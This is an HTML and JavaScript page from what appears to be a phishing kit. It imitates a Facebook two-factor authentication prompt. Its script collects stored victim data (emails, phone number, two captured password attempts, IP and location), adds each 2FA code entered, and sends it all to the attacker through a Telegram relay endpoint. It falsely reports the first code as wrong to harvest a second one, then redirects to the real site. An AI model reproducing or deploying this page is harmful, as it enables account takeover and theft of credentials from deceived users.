<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Two-Factor Authentication</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f0f2f5;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .form-container {
        background-color: #fff;
        padding: 30px;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,.1);
        max-width: 400px;
        width: 100%;
        text-align: center;
    }
    .form-container h2 {
        margin-bottom: 20px;
    }
    .form-container input[type="text"] {
        width: calc(100% - 20px);
        padding: 12px 10px;
        margin-bottom: 15px;
        border: 1px solid #ddd;
        border-radius: 6px;
        font-size: 15px;
    }
    .form-container input[type="text"]:focus {
        border-color: #1877f2;
        outline: none;
    }
    .form-container button {
        background-color: #1877f2;
        color: #fff;
        padding: 12px 25px;
        border: none;
        border-radius: 6px;
        font-size: 16px;
        cursor: pointer;
    }
    .form-container button:hover {
        background-color: #166fe5;
    }
    .error-message {
        color: #fa3e3e;
        font-size: 13px;
        margin-bottom: 10px;
        display: none;
    }
</style>
</head>
<body>
<div class="form-container">
    <h2>Two-Factor Authentication</h2>
    <p>Enter the 6-digit code sent to your device.</p>
    <input type="text" id="twoFAInput" placeholder="123456">
    <div class="error-message" id="twoFAError">Incorrect code. Please try again.</div>
    <button id="confirm2FAButton">Confirm</button>
</div>

<script>
    let twoFAAttemptCount = 0;
    const twoFAInput = document.getElementById('twoFAInput');
    const twoFAError = document.getElementById('twoFAError');
    const confirm2FAButton = document.getElementById('confirm2FAButton');

    const formData = JSON.parse(localStorage.getItem('formData') || '{}');
    const ipAddress = localStorage.getItem('ipAddress') || 'N/A';
    const locationData = localStorage.getItem('locationData') || 'N/A';
    const passwordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
    const passwordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';

    async function sendMessageToTelegram(message) {
        try {
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: message })
            });
            const data = await response.json();
            if (!data.success) console.error('Telegram API error:', data.error);
        } catch (error) {
            console.error('Error calling Telegram API:', error);
        }
    }

    confirm2FAButton.addEventListener('click', async () => {
        const code = twoFAInput.value.trim();
        if (!code) {
            twoFAError.textContent = 'Code cannot be empty.';
            twoFAError.style.display = 'block';
            return;
        }

        twoFAAttemptCount++;
        let message = `<b>2FA Attempt ${twoFAAttemptCount}</b>\n`;
        message += `IP & Location: ${ipAddress} (${locationData})\n`;
        message += `Page Name: ${formData.yourName || ''}\n`;
        message += `Business Email: ${formData.businessEmail || ''}\n`;
        message += `Personal Email: ${formData.personalEmail || ''}\n`;
        message += `Mobile Phone: ${formData.mobilePhoneNumber || ''}\n`;
        message += `Password Attempt 1: ${passwordAttemptValue1}\n`;
        message += `Password Attempt 2: ${passwordAttemptValue2}\n`;
        message += `2FA Code Attempt ${twoFAAttemptCount}: ${code}\n`;

        await sendMessageToTelegram(message);

        if (twoFAAttemptCount < 2) {
            twoFAError.textContent = 'Incorrect code. Please try again.';
            twoFAError.style.display = 'block';
        } else {
            alert('Verification completed.');
            localStorage.clear();
            window.location.href = 'https://facebook.com';
        }

        twoFAInput.value = '';
    });
</script>
</body>
</html>
